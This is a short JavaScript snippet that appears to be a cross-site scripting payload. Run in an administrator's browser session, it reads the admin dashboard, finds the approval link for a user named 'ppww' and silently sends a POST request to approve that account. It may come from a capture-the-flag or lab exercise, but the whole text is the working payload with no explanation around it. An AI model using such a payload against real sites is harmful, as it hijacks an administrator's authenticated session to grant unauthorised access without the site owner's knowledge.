fetch('/admin/dashboard')
  .then(r => r.text())
  .then(html => {
    // Look specifically for the ppww username in the HTML
    const userPattern = /ppww[\s\S]*?action="\/admin\/approve\/([^"]+)"/;
    const match = userPattern.exec(html);
    
    // Only approve if we find the ppww user
    if (match && match[1]) {
      const userId = match[1];
      fetch('/admin/approve/' + userId, {method: 'POST'});
      console.log('Approved ppww with ID:', userId);
    }
  });
